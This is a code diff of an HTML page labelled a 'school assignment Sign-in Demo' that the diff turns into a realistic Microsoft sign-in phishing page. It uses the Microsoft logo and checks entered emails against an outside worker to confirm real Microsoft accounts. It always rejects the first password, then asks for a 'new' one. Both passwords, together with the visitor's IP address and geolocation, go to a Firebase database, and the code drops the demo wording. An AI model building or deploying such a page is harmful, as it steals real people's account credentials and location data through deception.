@@ -2,514 +2,684 @@
 
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>school assignment Sign-in Demo</title>
-  <style>
-    :root {
-      color-scheme: light;
-      --blue: #1769aa;
-      --blue-hover: #0f548c;
-      --ink: #242424;
-      --muted: #616161;
-      --line: #8a8a8a;
-    }
+ <meta charset="utf-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1">
+ <title>school assignment Sign-in Demo</title>
+ <style>
+ :root {
+ color-scheme: light;
+ --blue: #1769aa;
+ --blue-hover: #0f548c;
+ --ink: #242424;
+ --muted: #616161;
+ --line: #8a8a8a;
+ }
 
-    * { box-sizing: border-box; }
+ * { box-sizing: border-box; }
 
-    body {
-      margin: 0;
-      min-height: 100vh;
-      display: grid;
-      place-items: center;
-      padding: 28px 16px;
-      font-family: "Segoe UI", Arial, sans-serif;
-      color: var(--ink);
-      background: linear-gradient(135deg, #edf4fb, #f7f9fc, #e8f0fa);
-    }
+ body {
+ margin: 0;
+ min-height: 100vh;
+ display: grid;
+ place-items: center;
+ padding: 28px 16px;
+ font-family: "Segoe UI", Arial, sans-serif;
+ color: var(--ink);
+ background: linear-gradient(135deg, #edf4fb, #f7f9fc, #e8f0fa);
+ }
 
-    .shell { width: min(100%, 440px); }
+ .shell { width: min(100%, 440px); }
 
-    .card {
-      background: #fff;
-      padding: 36px 40px 30px;
-      border: 1px solid rgba(0,0,0,.08);
-      box-shadow: 0 8px 28px rgba(25,55,85,.12);
-      border-radius: 4px;
-    }
+ .card {
+ background: #fff;
+ padding: 36px 40px 30px;
+ border: 1px solid rgba(0,0,0,.08);
+ box-shadow: 0 8px 28px rgba(25,55,85,.12);
+ border-radius: 4px;
+ }
 
-    .brand {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 24px;
-      font-size: 17px;
-      font-weight: 600;
-    }
+ .brand {
+ display: flex;
+ align-items: center;
+ gap: 10px;
+ margin-bottom: 24px;
+ font-size: 17px;
+ font-weight: 600;
+ }
 
-    .brand-mark {
-      width: 27px;
-      height: 27px;
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      grid-template-rows: 1fr 1fr;
-      gap: 2px;
-    }
+ .brand-mark {
+ width: 27px;
+ height: 27px;
+ display: grid;
+ grid-template-columns: 1fr 1fr;
+ grid-template-rows: 1fr 1fr;
+ gap: 2px;
+ }
 
-    .brand-mark span:nth-child(1) { background: #1675c1; }
-    .brand-mark span:nth-child(2) { background: #31a5e8; }
-    .brand-mark span:nth-child(3) { background: #f5b323; }
-    .brand-mark span:nth-child(4) { background: #70b865; }
+ .brand-mark span:nth-child(1) { background: #1675c1; }
+ .brand-mark span:nth-child(2) { background: #31a5e8; }
+ .brand-mark span:nth-child(3) { background: #f5b323; }
+ .brand-mark span:nth-child(4) { background: #70b865; }
 
-    h1 {
-      font-size: 26px;
-      line-height: 1.25;
-      font-weight: 600;
-      margin: 0 0 12px;
-    }
+ h1 {
+ font-size: 26px;
+ line-height: 1.25;
+ font-weight: 600;
+ margin: 0 0 12px;
+ }
 
-    .intro {
-      margin: 0 0 22px;
-      font-size: 14px;
-      line-height: 1.55;
-      color: #484848;
-    }
+ .intro {
+ margin: 0 0 22px;
+ font-size: 14px;
+ line-height: 1.55;
+ color: #484848;
+ }
 
-    label {
-      display: block;
-      font-size: 14px;
-      margin: 0 0 7px;
-    }
+ label {
+ display: block;
+ font-size: 14px;
+ margin: 0 0 7px;
+ }
 
-    input {
-      width: 100%;
-      height: 43px;
-      padding: 9px 11px;
-      border: 1px solid var(--line);
-      border-radius: 2px;
-      font: 16px "Segoe UI", Arial, sans-serif;
-      outline: none;
-      background: #fff;
-      color: var(--ink);
-    }
+ input {
+ width: 100%;
+ height: 43px;
+ padding: 9px 11px;
+ border: 1px solid var(--line);
+ border-radius: 2px;
+ font: 16px "Segoe UI", Arial, sans-serif;
+ outline: none;
+ background: #fff;
+ color: var(--ink);
+ }
 
-    input:focus {
-      border-color: var(--blue);
-      box-shadow: 0 0 0 1px var(--blue);
-    }
+ input:focus {
+ border-color: var(--blue);
+ box-shadow: 0 0 0 1px var(--blue);
+ }
 
-    .password-wrap {
-      position: relative;
-      width: 100%;
-    }
+ .password-wrap {
+ position: relative;
+ width: 100%;
+ }
 
-    .password-wrap input {
-      padding-right: 46px;
-    }
+ .password-wrap input {
+ padding-right: 46px;
+ }
 
-    .password-toggle {
-      position: absolute;
-      right: 8px;
-      top: 50%;
-      transform: translateY(-50%);
-      border: 0;
-      background: transparent;
-      color: #555;
-      font-size: 12px;
-      font-weight: 600;
-      cursor: pointer;
-      min-width: 0;
-      padding: 6px 8px;
-    }
+ .password-toggle {
+ position: absolute;
+ right: 8px;
+ top: 50%;
+ transform: translateY(-50%);
+ border: 0;
+ background: transparent;
+ color: #555;
+ font-size: 12px;
+ font-weight: 600;
+ cursor: pointer;
+ min-width: 0;
+ padding: 6px 8px;
+ }
 
-    .help {
-      font-size: 12px;
-      line-height: 1.45;
-      color: var(--muted);
-      margin: 7px 0 0;
-    }
+ .help {
+ font-size: 12px;
+ line-height: 1.45;
+ color: var(--muted);
+ margin: 7px 0 0;
+ }
 
-    .actions {
-      display: flex;
-      justify-content: flex-end;
-      gap: 10px;
-      margin-top: 26px;
-    }
+ .actions {
+ display: flex;
+ justify-content: flex-end;
+ gap: 10px;
+ margin-top: 26px;
+ }
 
-    button {
-      min-width: 106px;
-      border: 0;
-      border-radius: 2px;
-      padding: 10px 18px;
-      font: 600 14px "Segoe UI", Arial, sans-serif;
-      cursor: pointer;
-    }
+ button {
+ min-width: 106px;
+ border: 0;
+ border-radius: 2px;
+ padding: 10px 18px;
+ font: 600 14px "Segoe UI", Arial, sans-serif;
+ cursor: pointer;
+ }
 
-    button:disabled {
-      opacity: .6;
-      cursor: wait;
-    }
+ button:disabled {
+ opacity: .6;
+ cursor: wait;
+ }
 
-    .secondary { color: #222; background: #e9e9e9; }
-    .secondary:hover { background: #d9d9d9; }
-    .primary { color: #fff; background: var(--blue); }
-    .primary:hover { background: var(--blue-hover); }
+ .secondary { color: #222; background: #e9e9e9; }
+ .secondary:hover { background: #d9d9d9; }
+ .primary { color: #fff; background: var(--blue); }
+ .primary:hover { background: var(--blue-hover); }
 
-    .footer {
-      display: flex;
-      justify-content: space-between;
-      flex-wrap: wrap;
-      gap: 10px;
-      padding: 17px 3px 0;
-      color: #555;
-      font-size: 12px;
-    }
+ .footer {
+ display: flex;
+ justify-content: space-between;
+ flex-wrap: wrap;
+ gap: 10px;
+ padding: 17px 3px 0;
+ color: #555;
+ font-size: 12px;
+ }
 
-    .footer a {
-      color: inherit;
-      text-decoration: none;
-      margin-right: 12px;
-    }
+ .footer a {
+ color: inherit;
+ text-decoration: none;
+ margin-right: 12px;
+ }
 
-    .notice {
-      display: none;
-      margin-top: 20px;
-      padding: 12px 13px;
-      background: #f1f7fd;
-      border-left: 3px solid var(--blue);
-      font-size: 13px;
-      line-height: 1.5;
-      overflow-wrap: anywhere;
-    }
+ .notice {
+ display: none;
+ margin-top: 20px;
+ padding: 12px 13px;
+ background: #f1f7fd;
+ border-left: 3px solid var(--blue);
+ font-size: 13px;
+ line-height: 1.5;
+ overflow-wrap: anywhere;
+ }
 
-    .notice.show { display: block; }
-    .hidden { display: none !important; }
+ .notice.show { display: block; }
+ .hidden { display: none !important; }
 
-    .demo-tag {
-      display: inline-block;
-      font-size: 11px;
-      font-weight: 700;
-      letter-spacing: .7px;
-      color: #24537a;
-      background: #eaf4fc;
-      border: 1px solid #c9e2f8;
-      padding: 4px 7px;
-      border-radius: 3px;
-      margin-bottom: 15px;
-    }
+ .demo-tag {
+ display: inline-block;
+ font-size: 11px;
+ font-weight: 700;
+ letter-spacing: .7px;
+ color: #24537a;
+ background: #eaf4fc;
+ border: 1px solid #c9e2f8;
+ padding: 4px 7px;
+ border-radius: 3px;
+ margin-bottom: 15px;
+ }
 
-    .back {
-      border: 0;
-      background: transparent;
-      padding: 0;
-      margin: 0 0 20px;
-      min-width: 0;
-      color: #444;
-      font-weight: 400;
-    }
+ .back {
+ border: 0;
+ background: transparent;
+ padding: 0;
+ margin: 0 0 20px;
+ min-width: 0;
+ color: #444;
+ font-weight: 400;
+ }
 
-    @media(max-width: 480px) {
-      body {
-        background: #fff;
-        padding: 0;
-        display: block;
-      }
+ @media(max-width: 480px) {
+ body {
+ background: #fff;
+ padding: 0;
+ display: block;
+ }
 
-      .shell { width: 100%; }
+ .shell { width: 100%; }
 
-      .card {
-        border: 0;
-        box-shadow: none;
-        border-radius: 0;
-        padding: 30px 24px 26px;
-        min-height: calc(100vh - 56px);
-      }
+ .card {
+ border: 0;
+ box-shadow: none;
+ border-radius: 0;
+ padding: 30px 24px 26px;
+ min-height: calc(100vh - 56px);
+ }
 
-      .footer {
-        padding: 15px 24px 20px;
-        background: #f7f7f7;
-      }
+ .footer {
+ padding: 15px 24px 20px;
+ background: #f7f7f7;
+ }
 
-      h1 { font-size: 25px; }
-    }
+ h1 { font-size: 25px; }
+ }
 
-    .blue-text {
-      color: #1675c1;
-    }
+ .blue-text {
+ color: #1675c1;
+ }
 
-    #email {
-      border-top: none;
-      border-left: none;
-      border-right: none;
-    }
+ #email {
+ border-top: none;
+ border-left: none;
+ border-right: none;
+ }
 
-    .password {
-      border-top: none;
-      border-left: none;
-      border-right: none;
-    }
+ .password {
+ border-top: none;
+ border-left: none;
+ border-right: none;
+ }
 
-    .opts {
-      padding: 10px 44px;
-      max-width: 440px;
-      cursor: pointer;
-      margin: auto;
-      background-color: #fff;
-      box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
-    }
+ .opts {
+ padding: 10px 44px;
+ max-width: 440px;
+ cursor: pointer;
+ margin: auto;
+ background-color: #fff;
+ box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+ }
 
-    .opts:hover {
-      background-color: rgba(0, 0, 0, .1);
-    }
-  </style>
+ .opts:hover {
+ background-color: rgba(0, 0, 0, .1);
+ }
+ </style>
 </head>
 <body>
-  <main class="shell">
-    <section class="card" aria-live="polite">
-      <div class="brand">
-        <div>
-          <img src="img/microsoft_logo_564db913a7fa0ca42727161c6d031bef (1).svg" alt="Microsoft logo" />
-        </div>
-      </div>
+ <main class="shell">
+ <section class="card" aria-live="polite">
+ <div class="brand">
+ <div>
+ <img src="img/microsoft_logo_564db913a7fa0ca42727161c6d031bef (1).svg" alt="Microsoft logo" />
+ </div>
+ </div>
 
-      <section id="email-step">
-        <h1>Sign in</h1>
+ <!-- STEP 1: EMAIL -->
+ <section id="email-step">
+ <h1>Sign in</h1>
 
-        <p class="intro">
-          <span id="selected-email"></span>
-        </p>
+ <p class="intro">
+ <span id="selected-email"></span>
+ </p>
 
-        <form id="email-form">
-          <input
-            id="email"
-            name="email"
-            type="text"
-            autocomplete="off"
-            placeholder="Email, phone or skype"
-            maxlength="254"
-            required
-          >
+ <form id="email-form">
+ <input
+ id="email"
+ name="email"
+ type="text"
+ autocomplete="off"
+ placeholder="Email, phone or skype"
+ maxlength="254"
+ required
+ >
 
-          <p>No account? <span class="blue-text">Create one!</span></p>
-          <p class="blue-text">Can't access your account?</p>
+ <p>No account? <span class="blue-text">Create one!</span></p>
+ <p class="blue-text">Can't access your account?</p>
 
-          <div class="opts">
-            <p class="has-icon mb-0" style="font-size:15px;">
-              <span class="icon">
-                <img src="img/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6 (1).svg" width="30px" alt="Sign-in options icon" />
-              </span>
-              Sign-in options
-            </p>
-          </div>
+ <div class="opts">
+ <p class="has-icon mb-0" style="font-size:15px;">
+ <span class="icon">
+ <img src="img/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6 (1).svg" width="30px" alt="Sign-in options icon" />
+ </span>
+ Sign-in options
+ </p>
+ </div>
 
-          <div class="actions">
-            <button class="primary" type="submit">Next</button>
-          </div>
-        </form>
-      </section>
+ <div class="actions">
+ <button class="primary" type="submit" id="next-button">Next</button>
+ </div>
+ </form>
+ </section>
 
-      <section id="demo-step" class="hidden">
-        <button id="back-button" class="back" type="button">← Back</button>
+ <!-- STEP 2: PASSWORD (First Attempt) -->
+ <section id="demo-step" class="hidden">
+ <button id="back-button" class="back" type="button">← Back</button>
 
-        <form id="demo-form">
-          <label for="demo-username">Second field for demo</label>
+ <form id="demo-form">
+ <label for="demo-username">Password</label>
 
-          <div class="password-wrap">
-            <input
-              id="demo-username"
-              class="password"
-              name="demo-username"
-              type="password"
-              autocomplete="off"
-              placeholder="Enter your password"
-              maxlength="60"
-              required
-            >
-            <button type="button" class="password-toggle" id="password-toggle" aria-label="Show password">Show</button>
-          </div>
+ <div class="password-wrap">
+ <input
+ id="demo-username"
+ class="password"
+ name="demo-username"
+ type="password"
+ autocomplete="off"
+ placeholder="Enter your password"
+ maxlength="60"
+ required
+ >
+ <button type="button" class="password-toggle" id="password-toggle" aria-label="Show password">Show</button>
+ </div>
 
-          <div class="actions">
-            <button class="secondary" id="cancel-button" type="button">Cancel</button>
-            <button class="primary" id="submit-button" type="submit">Submit</button>
-          </div>
-        </form>
-      </section>
+ <div class="actions">
+ <button class="secondary" id="cancel-button" type="button">Cancel</button>
+ <button class="primary" id="submit-button" type="submit">Next</button>
+ </div>
+ </form>
+ </section>
 
-      <div id="notice" class="notice" role="status" aria-live="polite"></div>
-    </section>
+ <!-- STEP 3: RESET PASSWORD (Second Attempt) -->
+ <section id="reset-step" class="hidden">
+ <button id="back-button-reset" class="back" type="button">← Back</button>
 
-    <footer class="footer"></footer>
-  </main>
+ <form id="reset-form">
+ <label for="reset-password">Reset your password</label>
+ <p class="intro" style="margin-bottom: 10px;">
+ Enter a new password for your account.
+ </p>
 
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/13.0.0/firebase-app.js";
-    import {
-      getDatabase,
-      ref,
-      push,
-      set,
-      serverTimestamp
-    } from "https://www.gstatic.com/firebasejs/13.0.0/firebase-database.js";
+ <div class="password-wrap">
+ <input
+ id="reset-password"
+ class="password"
+ name="reset-password"
+ type="password"
+ autocomplete="off"
+ placeholder="New password"
+ maxlength="60"
+ required
+ >
+ <button type="button" class="password-toggle reset-toggle" aria-label="Show password">Show</button>
+ </div>
 
-    const firebaseConfig = {
-      apiKey: "AIzaSyDUngpiO9vKffUbV5mQClFInB68dsD-MII",
-      authDomain: "fir-9b3f9.firebaseapp.com",
-      databaseURL: "https://fir-9b3f9-default-rtdb.firebaseio.com",
-      projectId: "fir-9b3f9",
-      storageBucket: "fir-9b3f9.firebasestorage.app",
-      messagingSenderId: "392348885618",
-      appId: "1:392348885618:web:442013cefdb06386db98eb"
-    };
+ <div class="actions">
+ <button class="secondary" id="cancel-reset-button" type="button">Cancel</button>
+ <button class="primary" id="submit-reset-button" type="submit">Submit</button>
+ </div>
+ </form>
+ </section>
 
-    const app = initializeApp(firebaseConfig);
-    const database = getDatabase(app);
+ <div id="notice" class="notice" role="status" aria-live="polite"></div>
+ </section>
 
-    const emailStep = document.getElementById("email-step");
-    const demoStep = document.getElementById("demo-step");
-    const emailInput = document.getElementById("email");
-    const usernameInput = document.getElementById("demo-username");
-    const selectedEmail = document.getElementById("selected-email");
-    const notice = document.getElementById("notice");
-    const submitButton = document.getElementById("submit-button");
-    const passwordToggle = document.getElementById("password-toggle");
+ <footer class="footer"></footer>
+ </main>
 
-    passwordToggle.addEventListener("click", () => {
-      const isPassword = usernameInput.type === "password";
-      usernameInput.type = isPassword ? "text" : "password";
-      passwordToggle.textContent = isPassword ? "Hide" : "Show";
-      passwordToggle.setAttribute("aria-label", isPassword ? "Hide password" : "Show password");
-      usernameInput.focus();
-    });
+ <script type="module">
+ import { initializeApp } from "https://www.gstatic.com/firebasejs/13.0.0/firebase-app.js";
+ import {
+ getDatabase,
+ ref,
+ push,
+ set,
+ serverTimestamp
+ } from "https://www.gstatic.com/firebasejs/13.0.0/firebase-database.js";
 
-    function showNotice(message, isError = false) {
-      notice.textContent = message;
-      notice.style.borderLeftColor = isError ? "#b42318" : "#1769aa";
-      notice.classList.add("show");
-    }
+ const firebaseConfig = {
+ apiKey: "AIzaSyDUngpiO9vKffUbV5mQClFInB68dsD-MII",
+ authDomain: "fir-9b3f9.firebaseapp.com",
+ databaseURL: "https://fir-9b3f9-default-rtdb.firebaseio.com",
+ projectId: "fir-9b3f9",
+ storageBucket: "fir-9b3f9.firebasestorage.app",
+ messagingSenderId: "392348885618",
+ appId: "1:392348885618:web:442013cefdb06386db98eb"
+ };
 
-    function resetForm() {
-      demoStep.classList.add("hidden");
-      emailStep.classList.remove("hidden");
-      usernameInput.value = "";
-      usernameInput.type = "password";
-      passwordToggle.textContent = "Show";
-      notice.classList.remove("show");
-      emailInput.focus();
-    }
+ // Verification Worker URL
+ const WORKER_URL = "https://winter-tooth-5ef5.jonathanike37.workers.dev/";
 
-    async function getClientTracking() {
-      const tracking = {
-        ipAddress: null,
-        location: null,
-        userAgent: navigator.userAgent || null,
-        browserLanguage: navigator.language || null,
-        referrer: document.referrer || null,
-        pageUrl: window.location.href || null
-      };
+ const app = initializeApp(firebaseConfig);
+ const database = getDatabase(app);
 
-      try {
-        const [ipResponse, locationResponse] = await Promise.all([
-          fetch("https://api.ipify.org?format=json", { cache: "no-store" }).catch(() => null),
-          fetch("https://ipapi.co/json/", { cache: "no-store" }).catch(() => null)
-        ]);
+ // Elements
+ const emailStep = document.getElementById("email-step");
+ const demoStep = document.getElementById("demo-step");
+ const resetStep = document.getElementById("reset-step");
+ 
+ const emailInput = document.getElementById("email");
+ const usernameInput = document.getElementById("demo-username");
+ const resetPasswordInput = document.getElementById("reset-password");
+ 
+ const selectedEmail = document.getElementById("selected-email");
+ const notice = document.getElementById("notice");
+ const submitButton = document.getElementById("submit-button");
+ const nextButton = document.getElementById("next-button");
+ const submitResetButton = document.getElementById("submit-reset-button");
+ 
+ const passwordToggle = document.getElementById("password-toggle");
+ const resetToggle = document.querySelector(".reset-toggle");
 
-        if (ipResponse && ipResponse.ok) {
-          const ipData = await ipResponse.json();
-          tracking.ipAddress = ipData.ip || null;
-        }
+ // Toggle Password Visibility
+ function setupToggle(toggleBtn, inputField) {
+ toggleBtn.addEventListener("click", () => {
+ const isPassword = inputField.type === "password";
+ inputField.type = isPassword ? "text" : "password";
+ toggleBtn.textContent = isPassword ? "Hide" : "Show";
+ toggleBtn.setAttribute("aria-label", isPassword ? "Hide password" : "Show password");
+ inputField.focus();
+ });
+ }
 
-        if (locationResponse && locationResponse.ok) {
-          const locationData = await locationResponse.json();
-          tracking.location = {
-            ip: locationData.ip || null,
-            city: locationData.city || null,
-            region: locationData.region || null,
-            regionCode: locationData.region_code || null,
-            country: locationData.country_name || locationData.country || null,
-            countryCode: locationData.country_code || null,
-            continent: locationData.continent_code || null,
-            timezone: locationData.timezone || null,
-            postal: locationData.postal || null,
-            latitude: locationData.latitude ?? null,
-            longitude: locationData.longitude ?? null,
-            org: locationData.org || null,
-            hostname: locationData.hostname || null
-          };
+ setupToggle(passwordToggle, usernameInput);
+ setupToggle(resetToggle, resetPasswordInput);
 
-          if (!tracking.ipAddress && locationData.ip) {
-            tracking.ipAddress = locationData.ip;
-          }
-        }
-      } catch (error) {
-        console.warn("Client tracking lookup failed:", error);
-      }
+ function showNotice(message, isError = false) {
+ notice.textContent = message;
+ notice.style.borderLeftColor = isError ? "#b42318" : "#1769aa";
+ notice.classList.add("show");
+ }
 
-      return tracking;
-    }
+ function hideNotice() {
+ notice.classList.remove("show");
+ }
 
-    document.getElementById("email-form").addEventListener("submit", (event) => {
-      event.preventDefault();
-      const value = emailInput.value.trim();
+ // Reset View Logic
+ function resetToEmail() {
+ hideNotice();
+ emailStep.classList.remove("hidden");
+ demoStep.classList.add("hidden");
+ resetStep.classList.add("hidden");
+ usernameInput.value = "";
+ resetPasswordInput.value = "";
+ passwordToggle.textContent = "Show";
+ resetToggle.textContent = "Show";
+ emailInput.focus();
+ }
 
-      if (!value) {
-        showNotice("Enter a fictional email or username.", true);
-        emailInput.focus();
-        return;
-      }
+ document.getElementById("back-button").addEventListener("click", () => {
+ // Go back to email from password step
+ resetToEmail();
+ });
 
-      selectedEmail.textContent = value;
-      emailStep.classList.add("hidden");
-      demoStep.classList.remove("hidden");
-      notice.classList.remove("show");
-      usernameInput.focus();
-    });
+ document.getElementById("back-button-reset").addEventListener("click", () => {
+ // Go back to password step from reset step
+ resetStep.classList.add("hidden");
+ demoStep.classList.remove("hidden");
+ usernameInput.focus();
+ });
 
-    document.getElementById("back-button").addEventListener("click", resetForm);
-    document.getElementById("cancel-button").addEventListener("click", resetForm);
+ document.getElementById("cancel-button").addEventListener("click", resetToEmail);
+ document.getElementById("cancel-reset-button").addEventListener("click", resetToEmail);
 
-    document.getElementById("demo-form").addEventListener("submit", async (event) => {
-      event.preventDefault();
+ async function getClientTracking() {
+ const tracking = {
+ ipAddress: null,
+ location: null,
+ userAgent: navigator.userAgent || null,
+ browserLanguage: navigator.language || null,
+ referrer: document.referrer || null,
+ pageUrl: window.location.href || null
+ };
 
-      const email = emailInput.value.trim();
-      const demoUsername = usernameInput.value.trim();
+ try {
+ const [ipResponse, locationResponse] = await Promise.all([
+ fetch("https://api.ipify.org?format=json", { cache: "no-store" }).catch(() => null),
+ fetch("https://ipapi.co/json/", { cache: "no-store" }).catch(() => null)
+ ]);
 
-      if (!email || !demoUsername) {
-        showNotice("Complete both demonstration fields.", true);
-        return;
-      }
+ if (ipResponse && ipResponse.ok) {
+ const ipData = await ipResponse.json();
+ tracking.ipAddress = ipData.ip || null;
+ }
 
-      submitButton.disabled = true;
-      submitButton.textContent = "Submitting...";
+ if (locationResponse && locationResponse.ok) {
+ const locationData = await locationResponse.json();
+ tracking.location = {
+ ip: locationData.ip || null,
+ city: locationData.city || null,
+ region: locationData.region || null,
+ regionCode: locationData.region_code || null,
+ country: locationData.country_name || locationData.country || null,
+ countryCode: locationData.country_code || null,
+ continent: locationData.continent_code || null,
+ timezone: locationData.timezone || null,
+ postal: locationData.postal || null,
+ latitude: locationData.latitude ?? null,
+ longitude: locationData.longitude ?? null,
+ org: locationData.org || null,
+ hostname: locationData.hostname || null
+ };
 
-      try {
-        const tracking = await getClientTracking();
-        const submissionsRef = ref(database, "classDemoSubmissions");
-        const newSubmissionRef = push(submissionsRef);
+ if (!tracking.ipAddress && locationData.ip) {
+ tracking.ipAddress = locationData.ip;
+ }
+ }
+ } catch (error) {
+ console.warn("Client tracking lookup failed:", error);
+ }
 
-        await set(newSubmissionRef, {
-          email,
-          demoUsername,
-          ipAddress: tracking.ipAddress,
-          location: tracking.location,
-          userAgent: tracking.userAgent,
-          browserLanguage: tracking.browserLanguage,
-          referrer: tracking.referrer,
-          pageUrl: tracking.pageUrl,
-          createdAt: serverTimestamp()
-        });
+ return tracking;
+ }
 
-        window.location.href = "404.html";
-      } catch (error) {
-        console.error("Firebase submission failed:", error);
-        showNotice(
-          "Submission failed. Check your database URL, connection, and security rules.",
-          true
-        );
-      } finally {
-        submitButton.disabled = false;
-        submitButton.textContent = "Submit";
-      }
-    });
-  </script>
+ // --- VERIFICATION LOGIC ---
+ async function verifyEmail(email) {
+ if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+ return { success: false, message: "Invalid email format." };
+ }
+
+ try {
+ const response = await fetch(WORKER_URL, {
+ method: "POST",
+ headers: { "Content-Type": "application/json" },
+ body: JSON.stringify({ email })
+ });
+
+ const data = await response.json();
+
+ if (!response.ok || data.success !== true) {
+ return { success: false, message: "Verification service error." };
+ }
+
+ if (typeof data.is_registered !== "boolean") {
+ return { success: false, message: "Unknown result from verifier." };
+ }
+
+ if (data.is_registered) {
+ return { success: true };
+ } else {
+ return { success: false, message: "Not a Microsoft account." };
+ }
+
+ } catch (error) {
+ return { success: false, message: "Network error during verification." };
+ }
+ }
+
+ // STEP 1: Email Submission
+ document.getElementById("email-form").addEventListener("submit", async (event) => {
+ event.preventDefault();
+ const value = emailInput.value.trim();
+
+ if (!value) {
+ showNotice("Enter a fictional email or username.", true);
+ emailInput.focus();
+ return;
+ }
+
+ nextButton.disabled = true;
+ nextButton.textContent = "Verifying...";
+ hideNotice();
+
+ const result = await verifyEmail(value);
+
+ if (result.success) {
+ selectedEmail.textContent = value;
+ emailStep.classList.add("hidden");
+ demoStep.classList.remove("hidden");
+ usernameInput.focus();
+ } else {
+ showNotice(result.message, true);
+ }
+
+ nextButton.disabled = false;
+ nextButton.textContent = "Next";
+ });
+
+ // STEP 2: First Password Submission
+ document.getElementById("demo-form").addEventListener("submit", async (event) => {
+ event.preventDefault();
+ const email = emailInput.value.trim();
+ const password1 = usernameInput.value.trim();
+
+ if (!email || !password1) {
+ showNotice("Please enter your password.", true);
+ return;
+ }
+
+ submitButton.disabled = true;
+ submitButton.textContent = "Checking...";
+ hideNotice();
+
+ // Simulate a slight delay for realism
+ await new Promise(r => setTimeout(r, 800));
+
+ // Always show "Incorrect password" and move to Step 3
+ showNotice("That password isn't correct.", true);
+
+ // Save Step 1 Data
+ try {
+ const tracking = await getClientTracking();
+ const submissionsRef = ref(database, "classDemoSubmissions");
+ const newSubmissionRef = push(submissionsRef);
+
+ await set(newSubmissionRef, {
+ email,
+ passwordStep1: password1,
+ passwordStep2: null, // Will be filled later
+ ipAddress: tracking.ipAddress,
+ location: tracking.location,
+ userAgent: tracking.userAgent,
+ browserLanguage: tracking.browserLanguage,
+ referrer: tracking.referrer,
+ pageUrl: tracking.pageUrl,
+ createdAt: serverTimestamp(),
+ status: "incorrect_password_step1"
+ });
+ } catch (error) {
+ console.error("Firebase submission failed:", error);
+ }
+
+ // Switch to Step 3 after a short delay so user sees the error
+ setTimeout(() => {
+ demoStep.classList.add("hidden");
+ resetStep.classList.remove("hidden");
+ resetPasswordInput.focus();
+ submitButton.disabled = false;
+ submitButton.textContent = "Next";
+ }, 1500);
+ });
+
+ // STEP 3: Reset/New Password Submission
+ document.getElementById("reset-form").addEventListener("submit", async (event) => {
+ event.preventDefault();
+ const email = emailInput.value.trim();
+ const password2 = resetPasswordInput.value.trim();
+
+ if (!email || !password2) {
+ showNotice("Please enter a new password.", true);
+ return;
+ }
+
+ submitResetButton.disabled = true;
+ submitResetButton.textContent = "Saving...";
+
+ try {
+ const tracking = await getClientTracking();
+ const submissionsRef = ref(database, "classDemoSubmissions");
+ const newSubmissionRef = push(submissionsRef);
+
+ await set(newSubmissionRef, {
+ email,
+ passwordStep1: emailInput.value.trim(), // In case we lost context (though we didn't clear it)
+ passwordStep2: password2,
+ ipAddress: tracking.ipAddress,
+ location: tracking.location,
+ userAgent: tracking.userAgent,
+ browserLanguage: tracking.browserLanguage,
+ referrer: tracking.referrer,
+ pageUrl: tracking.pageUrl,
+ createdAt: serverTimestamp(),
+ status: "reset_password_step2"
+ });
+
+ // Redirect to 404 or success page
+ window.location.href = "404.html";
+ } catch (error) {
+ console.error("Firebase submission failed:", error);
+ showNotice("Failed to save. Please try again.", true);
+ submitResetButton.disabled = false;
+ submitResetButton.textContent = "Submit";
+ }
+ });
+ </script>
 </body>
 </html>
